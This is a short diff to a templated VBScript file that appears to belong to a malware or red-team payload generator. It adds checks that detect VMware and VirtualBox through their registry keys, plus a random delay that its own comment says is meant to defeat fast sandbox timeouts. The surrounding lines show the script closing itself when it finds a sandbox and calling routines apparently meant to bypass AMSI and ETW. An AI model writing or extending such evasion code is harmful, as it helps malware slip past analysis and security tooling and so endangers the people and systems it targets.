@@ -52,10 +52,22 @@ Function {{ v.fn_sandbox }}()
             If pn = badList(j) Then {{ v.fn_sandbox }} = True: Exit Function
         Next
     Next
+    ' VM registry checks
+    On Error Resume Next
+    Dim sh: Set sh = CreateObject("WScript.Shell")
+    sh.RegRead "HKLM\SOFTWARE\VMware, Inc.\VMware Tools\InstallPath"
+    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
+    Err.Clear
+    sh.RegRead "HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions\Version"
+    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
+    Err.Clear
 End Function
 
 Sub {{ v.sub_run }}()
     If {{ v.fn_sandbox }}() Then self.close: Exit Sub
+    ' Brief execution delay (defeats fast sandbox timeouts)
+    Dim t0: t0 = Timer
+    Do While Timer - t0 < 2 + Rnd * 3: Loop
     Call {{ v.fn_amsi }}()
     Call {{ v.fn_etw }}()
 
